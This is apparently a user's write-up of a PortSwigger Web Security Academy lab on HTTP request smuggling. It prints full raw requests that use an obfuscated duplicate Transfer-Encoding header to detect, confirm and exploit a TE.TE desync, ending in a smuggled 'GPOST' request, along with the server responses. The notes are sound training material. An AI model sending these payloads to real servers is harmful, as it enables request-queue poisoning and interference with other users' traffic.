https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header

# Detection
![[Detection HTTP Request Smuggling.png]]
Detecting Front-end 
``` HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```
Got: 
```HTTP
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Content-Length: 27

{"error":"Invalid request"}
```
What is happening:
![[Invalid Chunk SIze.png]]
Frontend is using TE

Detecting what the backend is using

```HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

```
Got a **200 OK**
What is happening:
![[TE TE Detection.png]]

![[TE Header Obfuscations.png]]Add a second malformed Transfer-Encoding. 
```HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0

X

```
![[TE Obfuscation visual.png]]
Causes the backend to timeout and **500 Internal Server Error**

# Confirming
Now we can exchange the lab to a TE.CL vulnerability.
```HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

1
G
0


```
>**200 OK**

Immediately send a normal request:
```HTTP
POST / HTTP/2
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

foo=bar

```
Got **"Unrecognized method G0POST"**
![[TE.TE confirmation.png]]


# Crafting the exploit request

#### Updating the Content-Length of the smuggled request

Determining the minimum value for the smuggled request. 
>Adding one (+1) to the smugled request body so it can append to normal request.

![[Pasted image 20250818135755.png]]

#### Fixing the Chunk Size
![[Pasted image 20250818140740.png]]

#### Fixing the first Content-Length
![[Pasted image 20250818141150.png]]

# Exploiting
```HTTP
POST / HTTP/1.1
Host: 0a3400f70367a7d68109ed3b007e009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

x=1
0


```
**200 OK**

Immediately send the normal request:
```
POST / HTTP/2
Host: 0a3400f70367a7d68109ed3b007e009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

foo=bar
```
Got the **"Unrecognized method GPOST"**

